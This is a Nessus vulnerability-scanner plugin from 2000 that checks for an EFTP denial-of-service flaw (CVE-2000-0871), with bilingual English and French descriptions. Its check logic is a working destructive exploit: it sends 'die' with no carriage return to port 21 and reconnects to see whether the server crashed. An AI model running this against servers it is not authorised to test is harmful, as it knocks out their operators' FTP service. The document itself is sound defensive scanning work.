#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10510);
 script_bugtraq_id(1677);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-2000-0871");
 
 name["english"] = "EFTP carriage return DoS";
 name["francais"] = "Déni de service EFTP - retour chariot";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote FTP server crashes when data is sent
to port 21 without a carriage return at the end.

An attacker may use this flaw to prevent you
from publishing anything using FTP.

Solution : if you are using eftp, then change your ftp
server, if you are not, then contact
your vendor for a fix.

Risk factor : High";
 


 desc["francais"] = "
Le serveur FTP distant plante lorsque des données
sont envoyées sur le port 21 sans retour chariot à
la fin.


Un pirate peut utiliser ce problème pour vous empecher
de publier quoi que ce soit par ftp.

Solution; si vous utilisez eftp, alors changez de 
serveur ftp. Sinon, contactez le vendeur et
informez-le de cette vulnérabilité.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote ftp server";
 summary["francais"] = "Plante le serveur ftp distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "FTP";
 family["francais"] = "FTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 script_exclude_keys("ftp/false_ftp");
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  r = ftp_recv_line(socket:soc);
  if(!r)exit(0);
  
  send(socket:soc, data:"die");
  close(soc);

  sleep(1);
  soc = open_sock_tcp(port);
  if(!soc)
  {
    security_hole(port);
    exit(0);
  }
  r = ftp_recv_line(socket:soc);
  close(soc);
  
  if(!r)security_hole(port);
 }
}
